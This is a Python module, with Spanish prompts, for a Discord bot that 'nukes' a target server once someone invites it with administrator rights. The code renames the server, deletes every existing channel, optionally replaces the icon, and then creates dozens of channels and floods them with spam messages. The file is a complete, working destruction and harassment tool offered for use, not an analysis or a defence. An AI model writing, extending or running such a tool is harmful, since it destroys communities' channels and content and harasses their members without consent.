import asyncio

import aiohttp
import discord

from core import ui
from core.bot import make_bot, run_bot

NAME = "Auto-Nuke de servidor (al entrar)"


def run(cfg):
    ui.cabecera("02", "AUTO-NUKE DE SERVIDOR")
    ui.info("El bot espera a ser invitado y arrasa el servidor objetivo.")

    guild_id = ui.ask_int("ID del servidor objetivo")
    if cfg.es_protegida(guild_id):
        ui.err(f"La ID {guild_id} está protegida.")
        ui.pause()
        return

    nombre_servidor = ui.ask("Nuevo nombre del servidor")
    nombre_canal = ui.ask("Nombre para los canales")
    cantidad_canales = ui.ask_int("Canales a crear", default=30, minimum=1)
    cantidad_mensajes = ui.ask_int("Mensajes por canal", default=50, minimum=0)
    mensaje = ui.ask("Mensaje de spam")
    icono_url = ui.ask("URL del icono (ENTER para no cambiar)", required=False, default="")

    bot = make_bot(prefix=".")
    control = {"listo": False, "nukeando": False}

    async def cambiar_icono(guild, url):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url) as r:
                    if r.status == 200:
                        await guild.edit(icon=await r.read())
                        ui.ok("Icono del servidor actualizado.")
                    else:
                        ui.warn("No se pudo descargar el icono.")
        except Exception as e:
            ui.warn(f"Error con el icono: {e}")

    async def enviar_spam(canal):
        for _ in range(cantidad_mensajes):
            try:
                await canal.send(mensaje)
            except discord.HTTPException:
                break
            await asyncio.sleep(0.15)

    async def ejecutar_nuke(guild):
        if cfg.es_protegida(guild.id):
            ui.err(f"Servidor protegido ({guild.id}). Operación cancelada.")
            return

        ui.sep()
        ui.step(f"OBJETIVO: {guild.name} ({guild.id})")
        ui.sep()

        try:
            await guild.edit(name=nombre_servidor)
            ui.ok(f"Nombre -> {nombre_servidor}")
        except discord.HTTPException:
            ui.warn("No se pudo cambiar el nombre (faltan permisos).")

        ui.info("Borrando canales existentes...")
        for canal in list(guild.channels):
            try:
                await canal.delete()
            except discord.HTTPException:
                pass

        if icono_url:
            await cambiar_icono(guild, icono_url)

        ui.info("Creando canales...")
        creados = []
        for _ in range(cantidad_canales):
            try:
                creados.append(await guild.create_text_channel(nombre_canal))
            except discord.HTTPException:
                pass
        ui.ok(f"Canales creados: {len(creados)}")

        if cantidad_mensajes and mensaje:
            ui.info("Inyectando spam...")
            await asyncio.gather(*[enviar_spam(c) for c in creados], return_exceptions=True)

        ui.sep()
        ui.ok("AUTO-NUKE FINALIZADO CON ÉXITO")
        ui.sep()

    @bot.event
    async def on_ready():
        if control["listo"]:
            return
        control["listo"] = True

        ui.cabecera("02", "AUTO-NUKE DE SERVIDOR")
        ui.ok(f"Conectado como {bot.user}")
        enlace = (
            f"https://discord.com/oauth2/authorize?client_id={bot.user.id}"
            f"&permissions=8&scope=bot"
        )
        ui.title("ENLACE DE INVITACIÓN")
        print(f"{ui.CYAN}{ui.BOLD}{enlace}{ui.RESET}")

        guild = bot.get_guild(guild_id)
        if guild is not None:
            ui.warn("El bot ya está en el servidor. Ejecutando ahora...")
            control["nukeando"] = True
            await ejecutar_nuke(guild)
            await asyncio.sleep(2)
            await bot.close()
        else:
            ui.info("Esperando a que invites el bot al servidor objetivo...")

    @bot.event
    async def on_guild_join(guild):
        if cfg.es_protegida(guild.id):
            ui.warn(f"Servidor protegido ({guild.id}). Saliendo...")
            await guild.leave()
            return

        if guild.id == guild_id and not control["nukeando"]:
            control["nukeando"] = True
            await ejecutar_nuke(guild)
            await asyncio.sleep(2)
            await bot.close()

    run_bot(bot, cfg.token)
    ui.pause()
